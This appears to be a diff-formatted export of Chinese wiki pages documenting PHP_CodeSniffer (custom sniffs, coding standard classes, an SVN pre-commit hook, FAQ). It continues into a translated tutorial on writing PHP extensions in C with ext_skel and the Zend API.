+$ phpcs --config-set tab_width 4
+</code>
+
+== Poznámka:  ==
+当设置制表符宽度后，可以使用一下命令进行取消：
+
+<code>
+Disabling the replacement of tabs with spaces
+
+$ phpcs --tab-width=0 /path/to/code
+
+</code>
+
+===== 其他代码规范配置 =====
+设置 JSLint 路径
+Squiz 代码规范，包含一个使用
+**JSLint**检查 Javascript 的       sniff。JSLint是一款Js静态检查工具。使用 
+jslint_path
+       配置选项去设置它的目录：
+
+
+<code>
+Setting the path to JSLint
+     
+
+$ phpcs --config-set jslint_path /path/to/jslint.js
+</code>
+
+JSLint是纯Javascript源码，需要使用 
+**Rhino** 去执行它。 使用       
+rhino_path
+ 配置选项去设置它的目录：
+
+
+<code>
+Setting the path to Rhino
+
+
+$ phpcs --config-set rhino_path /path/to/rhino
+</code>
+
+设置 JavaScript Lint 路径
+同JSLint一样，
+**JavaScript Lint**       也是一款Js静态检查工具。使用 
+jsl_path
+ 配置选项去设置它的目录：
+
+<code>
+Setting the path to JavaScript Lint
+
+
+$ phpcs --config-set jsl_path /path/to/jsl
+</code>
+
+===== Zend 编码规范设置 =====
+设置Zend Code Analyzer 路径
+Zend 编码规范可使用 Zend Studio 下的 Zend Code Analyzer 工具来对Php进行分析。使用       
+zend_ca_path
+ 配置选项去设置它的目录：
+
+<code>
+Setting the path to the Zend Code Analyzer
+
+     
+
+$ phpcs --config-set zend_ca_path /path/to/ZendCodeAnalyzer
+</code>
+
+====== 自定义代码规范 ======
+介绍
+本章中我们将建立一个新的代码规范（仅有一个 sniff 文件），用于检测代码中Perl风格的注释。
+
+建立代码规范目录
+代码规范是一个有规范子目录结构的目录。所有的 
+sniff
+ 文件为独立的     
+class
+ 文件，且必须包含在代码规范目录内。 下面我们来建立一个具有代码规范目录结构的目录:
+
+
+<code>
+$ mkdir MyStandard
+$ mkdir MyStandard/Sniffs
+</code>
+
+== Poznámka:  ==
+代码规范目录可以放置在PHP_CodeSniffer目录之外，但当使用 
+-i
+       选项时其将不会被显示。如果你需要在列出代码规范支持列表时列出该规范，请按以下示例目录进行安排：
+
+<code>
+$ cd /path/to/PHP_CodeSniffer/CodeSniffer/Standards
+$ mkdir MyStandard
+$ mkdir MyStandard/Sniffs
+</code>
+
+MyStandard代表我们的代码规范。 子目录 
+Sniffs
+ 用来存储     
+sniff
+ 文件。
+
+
+该目录结构建立完成时，我们开始建立 
+class
+ 文件。 该文件可让 PHP_CodeSniffer     识别出该文件夹包含 sniffs ，且从中获取其他信息（如支持语言）。
+
+
+<code>
+$ cd MyStandard
+$ touch MyStandardCodingStandard.php
+</code>
+
+MyStandardCodingStandard.php 文件内容如下:
+
+
+<code>
+<?php
+/**
+ * MyStandard Coding Standard.
+ *
+ * PHP version 5
+ *
+ * @category  PHP
+ * @package   PHP_CodeSniffer
+ * @author    Your Name <you@domain.net>
+ * @license   http://matrix.squiz.net/developer/tools/php_cs/licence BSD Licence
+ * @version   SVN: $Id: coding-standard-tutorial.xml,v 1.9 2008-10-09 15:16:47 cweiske Exp $
+ * @link      http://pear.php.net/package/PHP_CodeSniffer
+ */
+
+if (class_exists('PHP_CodeSniffer_Standards_CodingStandard', true) === false) {
+    throw new PHP_CodeSniffer_Exception('Class PHP_CodeSniffer_Standards_CodingStandard not found');
+}
+
+/**
+ * MyStandard Coding Standard.
+ *
+ * @category  PHP
+ * @package   PHP_CodeSniffer
+ * @author    Your Name <you@domain.net>
+ * @license   http://matrix.squiz.net/developer/tools/php_cs/licence BSD Licence
+ * @version   Release: @package_version@
+ * @link      http://pear.php.net/package/PHP_CodeSniffer
+ */
+class PHP_CodeSniffer_Standards_MyStandard_MyStandardCodingStandard 
+        extends PHP_CodeSniffer_Standards_CodingStandard
+{
+
+}//end class
+?> 
+</code>
+
+== Poznámka:  ==
+代码规范类可以留空。该类可供覆盖的方法可以查看关于 
+**代码规范类** 的描述。
+
+建立 Sniff
+Sniff 文件必须是单独的文件，其名称要清晰的表述其规范内容，且必须以 
+Sniff.php
+     作为文件名结尾。 当前要建立的 
+sniff
+ 名称为 DisallowHashCommentsSniff.php     放置在 Sniffs/Commenting 目录，如下：
+
+
+<code>
+$ cd Sniffs
+$ mkdir Commenting
+$ touch Commenting/DisallowHashCommentsSniff.php
+</code>
+
+== Poznámka:  ==
+Sniffs 文件夹子目录命名并没有特殊的要求，便于查阅易于修改即可。
+
+sniff 类需要继承 PHP_CodeSniffer_Sniff 接口，以便 PHP_CodeSniffer 识别和执行。     PHP_CodeSniffer_Sniff 接口定义了两个方法，
+register()
+ 和     
+process()
+ 。
+
+
+register() 和 process() 方法
+register()
+ 方法用来注册需要进行验证的标志符。当遇到其中一个标志符的时候便执行     
+process()
+ 。在 
+process()
+     方法中，你可以使用当前文件的 PHP_CodeSniffer_File 对象和相关的位置栈信息。
+
+
+我们的例子中，只需要验证单行注释。 PHP_CodeSniffer 使用 token_get_all()     函数来获取标志符，其区分了注释和文档注释。因此 register() 方法只需要考虑 T_COMMENT 。
+
+
+<note warning>
+译者注：注释 T_COMMENT （ 
+#
+ ， 
+//
+ ）       ，多行注释 T_ML_COMMENT （
+ /* */
+ 仅用于 Php4，Php5 识别为       T_COMMENT)，文档注释 T_DOC_COMMENT （PHPDoc 风格的注释，仅用于 PHP 5。
+/**       */
+）。实际上我们需要在Php5中考虑多行注释，即将 
+/* */
+ 排除。
+
+</note>
+标志符栈
+sniff
+ 可以获取使用     
+PHP_CodeSniffer_File
+ 对象的 
+getTokens()
+     方法来获取标志符栈的信息。该方法返回一个以标志符出现位置为索引的数组。 每个标志符都由一个数组记录了     
+code
+, 
+type
+ 和     
+content
+ 等信息。 
+type
+ 是标志符常量名称 (例如：     注释的标志符名称为 'T_COMMENT' )，
+code
+ 是 
+type
+     的唯一整数值索引，即 
+code
+ 与 
+type
+ 所对应的标志符是一致的。     
+content
+ 是对应的源码片段。
+
+== Poznámka:  ==
+部分标志符有多个索引。具体信息可以在 
+PHP/CodeSniffer/File.php
+       注释中获取。
+
+报告错误
+当检查出错误时 
+sniff
+ 可以使用     
+PHP_CodeSniffer_File
+ 对象的 
+addError()
+     方法进行报告 。其中第一个参数是对错误的描述，第二个参数是对错误位置的描述。当错误并不严重时我们可以使用     
+addWarning()
+ 方法进行警告。
+
+DisallowHashCommentsSniff.php
+DisallowHashCommentsSniff.php
+ 的内容如下：
+
+<code>
+<?php
+/**
+ * This sniff prohibits the use of Perl style hash comments.
+ *
+ * PHP version 5
+ *
+ * @category  PHP
+ * @package   PHP_CodeSniffer
+ * @author    Your Name <you@domain.net>
+ * @license   http://matrix.squiz.net/developer/tools/php_cs/licence BSD Licence
+ * @version   SVN: $Id: coding-standard-tutorial.xml,v 1.9 2008-10-09 15:16:47 cweiske Exp $
+ * @link      http://pear.php.net/package/PHP_CodeSniffer
+ */
+
+/**
+ * This sniff prohibits the use of Perl style hash comments.
+ *
+ * An example of a hash comment is:
+ *
+ * <code>
+ *  # This is a hash comment, which is prohibited.
+ *  $hello = 'hello';
+ * </code>
+ * 
+ * @category  PHP
+ * @package   PHP_CodeSniffer
+ * @author    Your Name <you@domain.net>
+ * @license   http://matrix.squiz.net/developer/tools/php_cs/licence BSD Licence
+ * @version   Release: @package_version@
+ * @link      http://pear.php.net/package/PHP_CodeSniffer
+ */
+class MyStandard_Sniffs_Commenting_DisallowHashCommentsSniff implements PHP_CodeSniffer_Sniff
+{
+
+
+    /**
+     * Returns the token types that this sniff is interested in.
+     *
+     * @return array(int)
+     */
+    public function register()
+    {
+        return array(T_COMMENT);
+
+    }//end register()
+
+
+    /**
+     * Processes the tokens that this sniff is interested in.
+     *
+     * @param PHP_CodeSniffer_File $phpcsFile The file where the token was found.
+     * @param int                  $stackPtr  The position in the stack where
+     *                                        the token was found.
+     *
+     * @return void
+     */
+    public function process(PHP_CodeSniffer_File $phpcsFile, $stackPtr)
+    {
+        $tokens = $phpcsFile->getTokens();
+        if ($tokens[$stackPtr]['content']{0} === '#') {
+            $error = 'Hash comments are prohibited';
+            $phpcsFile->addError($error, $stackPtr);
+        }
+
+    }//end process()
+
+
+}//end class
+
+?> 
+</code>
+
+== Poznámka:  ==
+PHP_CodeSniffer 中几乎所有的 sniff 都仅用于检测 PHP 。你可以指定当前 sniff       所支持的语言列表,例如如果支持 PHP 和 JavaScript 之一。 你可以在 sniff 增加 $supportedTokenizers       成员变量 。
+
+
+向 sniff 中添加的代码如下：
+
+
+<code>
+<?php
+/**
+ * A list of tokenizers this sniff supports.
+ *
+ * @var array
+ */
+public $supportedTokenizers = array(
+                               'PHP',
+                               'JS',
+                              );
+?> 
+</code>
+
+结果
+现在我们可以建立一个含有
+Perl
+风格注释的
+PHP
+源码来测试刚写好的规范：
+
+
+测试文件如下：
+
+
+<code>
+<?php
+
+# Check for valid contents.
+if ($obj->contentsAreValid($array)) {
+    $value = $obj->getValue();
+
+    # Value needs to be an array.
+    if (is_array($value) === false) {
+        # Error.
+        $obj->throwError();
+        exit();
+    }
+}
+
+?> 
+</code>
+
+检测结果如下，可以看到出现了 3 个错误信息：
+
+
+<code>
+$ phpcs --standard=/path/to/MyStandard Test.php
+
+FILE: Test.php
+--------------------------------------------------------------------------------
+FOUND 3 ERROR(S) AND 1 WARNING(S) AFFECTING 3 LINE(S)
+--------------------------------------------------------------------------------
+ 3 | ERROR | Hash comments are prohibited
+ 7 | ERROR | Hash comments are prohibited
+ 9 | ERROR | Hash comments are prohibited
+--------------------------------------------------------------------------------
+</code>
+
+== Poznámka:  ==
+以上命令由于我们的代码规范目录名没有建立在 PHP_CodeSniffer 的主目录结构内，所以我们使用了绝对路径。       如果将代码规范目录建立在 
+PHP/PHP_CodeSniffer/Standards
+       之下，则只需要规范名称即可：
+
+<code>
+$ phpcs --standard=MyStandard Test.php
+</code>
+
+====== 代码规范类 ======
+介绍
+每个代码规范都拥有一个主代码规范类。 该类可让 PHP_CodeSniffer 识别出该文件夹包含 sniffs     （即该目录为代码规范目录），且从中获取其他信息（如支持语言）。下文将阐述如何覆盖代码规范类中的方法，来创建自己的代码规范类。
+
+getIncludedSniffs()
+该方法用于声明除了 sniffs 文件夹中规定的规范外，还包含其他规范中的 sniff 类或者某个 sniff     文件夹，甚至整个代码规范。
+
+
+下例中引入了整个 PEAR 规范， Generic 代码规范的 MultipleStatementAlignment sniff     类。还有 Generic 代码规范中 Functions 类别的所有 sniff 类。
+
+
+<code>
+<?php
+/**
+ * Return a list of external sniffs to include with this standard.
+ *
+ * The MyStandard coding standard uses some generic sniffs, and
+ * the entire PEAR coding standard.
+ *
+ * @return array
+ */
+public function getIncludedSniffs()
+{
+    return array(
+            'PEAR',
+            'Generic/Sniffs/Formatting/MultipleStatementAlignmentSniff.php',
+            'Generic/Sniffs/Functions',
+           );
+
+}//end getIncludedSniffs()
+?> 
+</code>
+
+== Poznámka:  ==
+当引入整个代码规范时，也引入了该规范引入的其他 sniff 或规范。如 PEAR 规范从 Generic 规范中引入了某些       sniff ，所以我们在引入整个 PEAR 规范时也引入了这些 sniff 。这使我们可以基于已有代码规范快速的建立新的代码规范。
+
+getExcludedSniffs()
+该方法可以从 getIncludedSniffs() 方法引入的 sniff 类中排除我们不需要使用的 sniff     类。同样的，我们可以排除单独的 sniff 类、文件夹或整个规范。
+
+
+下例中我们引入了整个 PEAR 代码规范，但排除了 ControlSignature sniff类。
+
+
+<code>
+<?php
+/**
+ * Return a list of external sniffs to include with this standard.
+ *
+ * The MyStandard coding standard uses all PEAR sniffs except one.
+ *
+ * @return array
+ */
+public function getIncludedSniffs()
+{
+    return array(
+            'PEAR',
+           );
+
+}//end getIncludedSniffs()
+
+
+/**
+ * Return a list of external sniffs to exclude from this standard.
+ *
+ * The MyStandard coding standard uses all PEAR sniffs except one.
+ *
+ * @return array
+ */
+public function getExcludedSniffs()
+{
+    return array(
+            'PEAR/Sniffs/ControlStructures/ControlSignatureSniff.php',
+           );
+
+}//end getExcludedSniffs()
+?> 
+</code>
+
+====== 使用Subversion pre-commit Hook ======
+介绍
+== Poznámka:  ==
+使用 SVN pre-commit hook 依赖其他工具，详情参见 
+**准备工具** 章节。
+
+Pre-commit hook 是版本控制工具 
+**Subversion**     的一个钩子（hook）。它在事务完成提交之前运行。该 hook 可以在代码提交到版本库前使用 PHP_CodeSniffer     对其检查。当发现错误时终止提交，并给出相关错误报告，以确保开发者提交到版本库的代码都符合代码规范。
+
+<code>
+Sample pre-commit output
+
+
+$ svn commit -m "Test" temp.php
+Sending        temp.php
+Transmitting file data .svn: Commit failed (details follow):
+svn: 'pre-commit' hook failed with error output:
+
+FILE: temp.php
+---------------------------------------------------------------
+FOUND 1 ERROR(S) AND 0 WARNING(S) AFFECTING 1 LINE(S)
+---------------------------------------------------------------
+ 2 | ERROR | Missing file doc comment
+--------------------------------------------------------------
+</code>
+
+配置 pre-commit Hook
+编辑 /path/to/PHP_CodeSniffer/scripts/phpcs-svn-pre-commit ，将第一行中     @php_bin@ 替换为PHP执行文件地址。 如： #!@php_bin@ 替换为了 #!/usr/bin/php.
+
+
+检查 svnlook 的地址（非必须）；
+
+
+<code>
+Changing the path to svnlook
+
+
+define('PHP_CODESNIFFER_SVNLOOK', '/usr/bin/svnlook');
+</code>
+
+在Subversion hook 目录下的 pre-commit 文件中加入一下命令：
+
+
+<code>
+Adding the pre-commit hook to the Subversion config file
+
+
+/path/to/PHP_CodeSniffer/scripts/phpcs-svn-pre-commit "$REPOS" -t "$TXN" >&2 || exit 1
+</code>
+
+在这里你可以像使用 phpcs 那样加入其他设置，如设置制表符宽度、指定代码规范等。
+
+
+<code>
+Adding the pre-commit hook to the Subversion config file
+
+
+/path/to/PHP_CodeSniffer/scripts/phpcs-svn-pre-commit --standard=Squiz --tab-width=4 "$REPOS" -t "$TXN" >&2 || exit 1
+</code>
+
+====== FAQ ======
+PHP_CodeSniffer是一个覆盖率或单元测试工具吗？
+不是的。 PHP_CodeSniffer 是用来检测你的代码是否遵从指定的代码规范，并不测试代码是否运行正常。
+
+== Poznámka:  ==
+译者注：实际上 PHP_CodeSniffer 根本不会去执行源代码。
+
+为什么要用PHP_CodeSniffer？
+如果你想确保自己的代码遵从了某代码规范，PHP_CodeSniffer 可以简单快速的办到。PHP_CodeSniffer     是代码复查时规范检测的绝佳选择，能够节省大量成本（时间，人力……）。
+
+== Poznámka:  ==
+编码规范可以使代码易于阅读和维护，特别是在同一项目拥有多个开发者时。如果你还没有使用任何代码规范，请考虑现在就开始吧。
+
+PHP_CodeSniffer 的分析来确保代码可以执行吗？
+不是的。PHP_CodeSniffer 并没有真正的解析你的代码，所以也就无法准确的报告出解析错误数量等信息。     PHP_CodeSniffer 仅会报告由 sniff 检测出的潜在错误。
+
+== Tip:  ==
+你可以使用 -l (小写 L) 选项来检测Php源码的语法错误：
+
+<code>
+$ php -l /path/to/code/myfile.inc
+No syntax errors detected in /path/to/code/myfile.inc
+</code>
+
+<code>
+译者注： 如下示例。phpcs并没有发现 PHP 文件中的语法错误，而只提示未发现文档。
+
+myfile.php
+<?php
+TOKEN ERROR TEST;
+?>
+
+$ phpcs myfile.php
+--------------------------------------------------------------------------------
+FOUND 1 ERROR(S) AND 0 WARNING(S) AFFECTING 1 LINE(S)
+--------------------------------------------------------------------------------
+ 2 | ERROR | Missing file doc comment
+--------------------------------------------------------------------------------
+
+</code>
+
+自带的代码规范并不适合我，能自己定制代码规范吗？
+当然可以。PHP_CodeSniffer的核心功能是提供检测代码规范的执行环境。同 PHP_CodeSniffer     一同发布的有多个范例代码规范，可以帮助开发人员来实现自己的规范。如果你需要开发自己的代码规范，可以查阅 
+**自定义代码规范** 章节。
+
+PHP_CodeSniffer 是怎么报告错误的，错误怎么越解决越多了？
+有时在解决已有错误时会产生其他的错误。例如 PHP_CodeSniffer 可能会提示你 IF 语句需要有花括号，当你添加上时     PHP_CodeSniffer 又可能提示你添加的位置或缩进有问题。
+
+
+所以你应该在解决错误之后再次检查，知直到完全通过。
+
+
+为什么 PHP_CodeSniffer 不直接依照报告中的建议修改代码？
+无论我们有多么相信 PHP_CodeSniffer     检查意见的可靠性，但在亲自复查之前用程序去自动修改源码都是非常鲁莽的。在抱怨得逐个手动修改那些代码前，为什么不看以下几点手动修改给我们带来的好处呢。
+
+
+手动改进代码可能带来的好处：
+开发者会更加熟悉代码规范，减少以后的出错率。
+
+可以确认 PHP_CodeSniffer 是否像预期的那样正确执行。
+
+开发者可以排除一些确实不能遵从代码规范的特殊片段。
+
+所以在当你期望 PHP_CodeSniffer     直接去修复代码时，或许应该考虑下加深对代码规范的学习并更严格的执行会更好些。
+
+
+== Poznámka:  ==
+无论 PHP_CodeSniffer       建议你修改的部分有多简单，甚至看起来微不足道，但在提交到版本库或发布之前都应该再次进行检查。
+
+PHP_CodeSniffer 使用什么来解析我的代码？
+在分析PHP文件时 PHP_CodeSniffer 使用 
+**PHP内置分词函数**     来分析你的代码。它提供了关于源文件的大量信息，如定义函数的花括号。
+
+
+分析其他类型的文件时 PHP_CodeSniffer     会使用自带的分词器。该分词器使用或模拟了PHP内置分词器。这时分词操作可能会花费更长的时间，但无论如何都会使分词在各规范下正常应用。
+
+
+====== 介绍 ======
+作者介绍
+作者：Andi Gutmans, Stig Sæther Bakken, Derick Rethans
+
+
+文章出处：<PHP 5 Power Programming> Chapter 15 (英文版下载: 
+**PHP
+      5 Power Programming** )
+
+
+出版商：Prentice Hall PTR
+
+
+ISBN：0-13-147149-X
+
+
+出版日期：2004-10-27
+
+
+最后更新：2009-04-29
+
+
+编辑介绍
+翻译：taft(taft at wjl.cn) （
+**http://blog.csdn.net/taft/archive/2006/02/10/596291.aspx**）
+
+
+校对：laruence at yahoo.com.cn （
+**http://www.laruence.com/2009/04/28/719.html**）
+
+
+简 介
+PHP取得成功的一个主要原因之一是她拥有大量的可用扩展。web开发者无论有何种需求，这种需求最有可能在PHP发行包里找到。PHP发行包包括支持各种数据库，图形文件格式，压缩，XML技术扩展在内的许多扩展。
+
+
+扩展API的引入使PHP3取得了巨大的进展，扩展API机制使PHP开发社区很容易的开发出几十种扩展。现在，两个版本过去了，API仍然和PHP3时的非常相似。扩展主要的思想是：尽可能的从扩展编写者那里隐藏PHP的内部机制和脚本引擎本身，仅仅需要开发者熟悉API。
+
+
+有两个理由需要自己编写PHP扩展。第一个理由是：PHP需要支持一项她还未支持的技术。这通常包括包裹一些现成的C函数库，以便提供PHP接口。例如，如果一个叫FooBase的数据库已推出市场，你需要建立一个PHP扩展帮助你从PHP里调用FooBase的C函数库。这个工作可能仅由一个人完成，然后被整个PHP社区共享（如果你愿意的话）。第二个不是很普遍的理由是：你需要从性能或功能的原因考虑来编写一些商业逻辑。
+
+
+如果以上的两个理由都和你没什么关系，同时你感觉自己没有冒险精神，那么你可以跳过本章。
+
+
+本章教你如何编写相对简单的PHP扩展，使用一部分扩展API函数。对于大多数打算开发自定义PHP扩展开发者而言，它含概了足够的资料。学习一门编程课程的最好方法之一就是动手做一些极其简单的例子，这些例子正是本章的线索。一旦你明白了基础的东西，你就可以在互联网上通过阅读文挡、原代码或参加邮件列表新闻组讨论来丰富自己。因此，本章集中在让你如何开始的话题。在UNIX下一个叫ext_skel的脚本被用于建立扩展的骨架，骨架信息从一个描述扩展接口的定义文件中取得。因此你需要利用UNIX来建立一个骨架。Windows开发者可以使用Windows       ext_skel_win32.php代替ext_skel。
+
+
+然而，本章关于用你开发的扩展编译PHP的指导仅涉及UNIX编译系统。本章中所有的对API的解释与UNIX和Windows下开发的扩展都有联系。
+
+
+当你阅读完这章，你能学会如何
+建立一个简单的商业逻辑扩展。
+
+建议个C函数库的包裹扩展，尤其是有些标准C文件操作函数比如fopen()
+
+====== 快速开始 ======
+本节没有介绍关于脚本引擎基本构造的一些知识，而是直接进入扩展的编码讲解中，因此不要担心你无法立刻获得对扩展整体把握的感觉。假设你正在开发一个网站，需要一个把字符串重复n次的函数。下面是用PHP写的例子：
+
+
+<code>
+function self_concat($string, $n){
+    $result = "";
+for($i = 0; $i < $n; $i++){
+    $result .= $string;
+}
+    return $result;
+}
+    
+self_concat("One", 3) returns "OneOneOne".
+    
+self_concat("One", 1) returns "One".
+</code>
+
+假设由于一些奇怪的原因，你需要时常调用这个函数，而且还要传给函数很长的字符串和大值n。这意味着在脚本里有相当巨大的字符串连接量和内存重新分配过程，以至显著地降低脚本执行速度。如果有一个函数能够更快地分配大量且足够的内存来存放结果字符串，然后把$string重复n次，就不需要在每次循环迭代中分配内存。
+
+
+为扩展建立函数的第一步是写一个函数定义文件，该函数定义文件定义了扩展对外提供的函数原形。该例中，定义函数只有一行函数原形self_concat()     :
+
+
+<code>
+string self_concat(string str, int n)
+</code>
+
+函数定义文件的一般格式是一个函数一行。你可以定义可选参数和使用大量的PHP类型，包括: bool, float, int, array     等。
+
+
+保存为myfunctions.def文件至PHP原代码目录树下。
+
+
+该是通过扩展骨架(skeleton)构造器运行函数定义文件的时机了。该构造器脚本叫ext_skel，放在PHP原代码目录树的 ext/     目录下（PHP原码主目录下的README.EXT_SKEL提供了更多的信息）。假设你把函数定义保存在一个叫做myfunctions.def的文件里，而且你希望把扩展取名为myfunctions，运行下面的命令来建立扩展骨架
+
+
+<code>
+./ext_skel --extname=myfunctions --proto=myfunctions.def
+</code>
+
+这个命令在ext/目录下建立了一个myfunctions/目录。你要做的第一件事情也许就是编译该骨架，以便编写和测试实际的C代码。编译扩展有两种方法：
+作为一个可装载模块或者DSO（动态共享对象）
+
+静态编译到PHP
+
+
+**PHP扩展开发导图(原图)**
+
+{{:php_extension.jpg|php_extension.jpg}}
+\\
+因为第二种方法比较容易上手，所以本章采用静态编译。如果你对编译可装载扩展模块感兴趣，可以阅读PHP原代码根目录下的README.SELF-     CONTAINED_EXTENSIONS文件。为了使扩展能够被编译，需要修改扩展目录ext/myfunctions/下的config.m4文件。扩展没有包裹任何外部的C库，你需要添加支持–enable-myfunctions配置开关到PHP编译系统里（–with-extension     开关用于那些需要用户指定相关C库路径的扩展）。可以去掉自动生成的下面两行的注释来开启这个配置。
+
+
+<code>
+./ext_skel --extname=myfunctions --proto=myfunctions.def
+PHP_ARG_ENABLE(myfunctions, whether to enable myfunctions support,
+
+[ --enable-myfunctions Include myfunctions support])
+</code>
+
+\\
+现在剩下的事情就是在PHP原代码树根目录下运行./buildconf，该命令会生成一个新的配置脚本。通过查看./configure     –help输出信息，可以检查新的配置选项是否被包含到配置文件中。现在，打开你喜好的配置选项开关和–enable-myfunctions重新配置一下PHP。最后的但不是最次要的是，用make来重新编译PHP。
+
+
+\\
+ext_skel应该把两个PHP函数添加到你的扩展骨架了：打算实现的self_concat()函数和用于检测myfunctions     是否编译到PHP的confirm_myfunctions_compiled()函数。完成PHP的扩展开发后，可以把后者去掉。
+
+
+<code>
+<?php
+print confirm_myfunctions_compiled("myextension");
+?>
+</code>
+
+\\
+运行这个脚本会出现类似下面的输出：
+
+
+<code>
+"Congratulations! You have successfully modified ext/myfunctions
+
+config.m4. Module myfunctions is now compiled into PHP."
+</code>
+
+\\
+另外，ext_skel脚本生成一个叫myfunctions.php的脚本，你也可以利用它来验证扩展是否被成功地编译到PHP。它会列出该扩展所支持的所有函数。
+
+
+\\
+现在你学会如何编译扩展了，该是真正地研究self_concat()函数的时候了。     下面就是ext_skel脚本生成的骨架结构：
+
+
+<code>
+/* {{{ proto string self_concat(string str, int n)
+
+*/
+
+PHP_FUNCTION(self_concat)
+
+}
+
+char *str = NULL;
+
+int argc = ZEND_NUM_ARGS();
+
+int str_len;
+
+long n;
+
+if (zend_parse_parameters(argc TSRMLS_CC, "sl", &str, &str_len, &n) == FAILURE)
+
+return;
+
+php_error(E_WARNING, "self_concat: not yet implemented");
+
+}
+
+/* }}} */
+</code>
+
+\\
+自动生成的PHP函数周围包含了一些注释，这些注释用于自动生成代码文档和vi、Emacs等编辑器的代码折叠。函数自身的定义使用了宏     PHP_FUNCTION()，该宏可以生成一个适合于Zend引擎的函数原型。逻辑本身分成语义各部分，取得调用函数的参数和逻辑本身。
+
+
+\\
+为了获得函数传递的参数，可以使用zend_parse_parameters()API函数。下面是该函数的原型：
+
+
+<code>
+zend_parse_parameters(int num_args TSRMLS_DC, char *type_spec, …);
+</code>
+
+\\
+第一个参数是传递给函数的参数个数。通常的做法是传给它ZEND_NUM_ARGS()。这是一个表示传递给函数参数总个数的宏。第二个参数是为了线程安全，总是传递TSRMLS_CC宏，后面会讲到。第三个参数是一个字符串，指定了函数期望的参数类型，后面紧跟着需要随参数值更新的变量列表。因为PHP     采用松散的变量定义和动态的类型判断，这样做就使得把不同类型的参数转化为期望的类型成为可能。例如，如果用户传递一个整数变量，可函数需要一个浮点数，那么zend_parse_parameters()就会自动地把整数转换为相应的浮点数。如果实际值无法转换成期望类型（比如整形到数组形），会触发一个警告。
+
+
+\\
+下表列出了可能指定的类型，从完整性考虑也列出了一些没有讨论到的类型。
+
+
+
+Tabulka: **数据类型**
+
+|类型指定符|对应的C类型|描述|
+|l|long|符号整数|
+|d|double|浮点数|
+|s|char *, int|字符指针，长度|
+|b|zend_bool|布尔型（1或0）|
+|r|zval *|资源（文件指针，数据库连接等）|
+|a|zval *|联合数组|
+|o|zval *|不定类型对象|
+|O|zval *|指定类型的对象。需要提供目标对象的类类型|
+|z|zval *|无任何操作的zval|
+\\
+为了容易地理解最后几个选项的含义，你需要知道zval是Zend引擎的值容器。无论这个变量是布尔型，字符串型或者其他任何类型，其信息总会包含在一个zval联合体中。本章中我们不直接存取zval，而是通过一些附加的宏来操作。下面的是或多或少在C中的zval,     以便我们能更好地理解接下来的代码。
+
+
+<code>
+ typedef union _zval{
+      long lval;
+      double dval;
+      struct {
+           char *val;
+           int len;
+      }str;
+  
+      HashTable *ht;
+      zend_object_value obj;
+  
+ }zval;
+</code>
+
+\\
+在我们的例子中，我们用基本类型调用zend_parse_parameters()，以本地C类型的方式取得函数参数的值，而不是用zval容器。
+
+
+\\
+为了让zend_parse_parameters()能够改变传递给它的参数的值，并返回这个改变值，需要传递一个引用。仔细查看一下self_concat()：
+
+
+<code>
+if (zend_parse_parameters(argc TSRMLS_CC, "sl", &str, &str_len, &n) == FAILURE) return;
+</code>
+
+\\
+注意到自动生成的代码会检测函数的返回值FAILUER(成功即SUCCESS)来判断是否成功。如果没有成功则立即返回，并且由     zend_parse_parameters()负责触发警告信息。因为函数打算接收一个字符串l和一个整数n，所以指定 ”sl”     作为其类型指示符。s需要两个参数，所以我们传递参考char * 和 int (str 和     str_len)给zend_parse_parameters()函数。无论什么时候，记得总是在代码中使用字符串长度str_len来确保函数工作在二进制安全的环境中。不要使用strlen()和strcpy()，除非你不介意函数在二进制字符串下不能工作。二进制字符串是包含有nulls的字符串。二进制格式包括图象文件，压缩文件，可执行文件和更多的其他文件。”l”     只需要一个参数，所以我们传递给它n的引用。尽管为了清晰起见，骨架脚本生成的C变量名与在函数原型定义文件中的参数名一样；这样做不是必须的，尽管在实践中鼓励这样做。
+
+
+\\
+回到转换规则中来。下面三个对self_concat()函数的调用使str, str_len和n得到同样的值：
+
+
+<code>
+self_concat("321", 5);
+
+self_concat(321, "5");
+
+self_concat("321", "5");
+
+str points to the string "321", str_len equals 3, and n equals 5.
+
+str 指向字符串"321"，str_len等于3，n等于5。
+</code>
+
+\\
+在我们编写代码来实现连接字符串返回给PHP的函数前，还得谈谈两个重要的话题：内存管理、从PHP内部返回函数值所使用的API。
+
+
+===== 内存管理 =====
+用于从堆中分配内存的PHP API几乎和标准C       API一样。在编写扩展的时候，使用下面与C对应（因此不必再解释）的API函数：
+
+
+<code>
+emalloc(size_t size);
+
+efree(void *ptr);
+
+ecalloc(size_t nmemb, size_t size);
+
+erealloc(void *ptr, size_t size);
+
+estrdup(const char *s);
+
+estrndup(const char *s, unsigned int length);
+</code>
+
+在这一点上，任何一位有经验的C程序员应该象这样思考一下：“什么？标准C没有strndup()？”是的，这是正确的，因为GNU扩展通常在Linux       下可用。estrndup()只是PHP下的一个特殊函数。它的行为与estrdup()相似，但是可以指定字符串重复的次数（不需要结束空字符），同时是二进制安全的。这是推荐使用estrndup()而不是estrdup()的原因。
+
+
+在几乎所有的情况下，你应该使用这些内存分配函数。有一些情况，即扩展需要分配在请求中永久存在的内存，从而不得不使用malloc()，但是除非你知道你在做什么，你应该始终使用以上的函数。如果没有使用这些内存函数，而相反使用标准C函数分配的内存返回给脚本引擎，那么PHP会崩溃。
+
+
+这些函数的优点是：任何分配的内存在偶然情况下如果没有被释放，则会在页面请求的最后被释放。因此，真正的内存泄漏不会产生。然而，不要依赖这一机制，从调试和性能两个原因来考虑，应当确保释放应该释放的内存。剩下的优点是在多线程环境下性能的提高，调试模式下检测内存错误等。
+
+
+还有一个重要的原因，你不需要检查这些内存分配函数的返回值是否为null。当内存分配失败，它们会发出E_ERROR错误，从而决不会返回到扩展。
+
+
+===== 从PHP函数中返回值 =====
+扩展API包含丰富的用于从函数中返回值的宏。这些宏有两种主要风格：第一种是RETVAL_type()形式，它设置了返回值但C代码继续执行。这通常使用在把控制交给脚本引擎前还希望做的一些清理工作的时候使用，然后再使用C的返回声明       ”return”       返回到PHP；后一个宏更加普遍，其形式是RETURN_type()，他设置了返回类型，同时返回控制到PHP。下表解释了大多数存在的宏。
+
+
+Tabulka: ****
+
+|设置返回值并且结束函数|设置返回值|宏返回类型和参数|
+|RETURN_LONG(l)|RETVAL_LONG(l)|整数|
+|RETURN_BOOL(b)|RETVAL_BOOL(b)|布尔数(1或0)|
+|RETURN_NULL()|RETVAL_NULL()|NULL|
+|RETURN_DOUBLE(d)|RETVAL_DOUBLE(d)|浮点数|
+|RETURN_STRING(s, dup)|RETVAL_STRING(s, dup)|字符串。如果dup为1，引擎会调用estrdup()重复s，使用拷贝。如果dup为0，就使用s。|
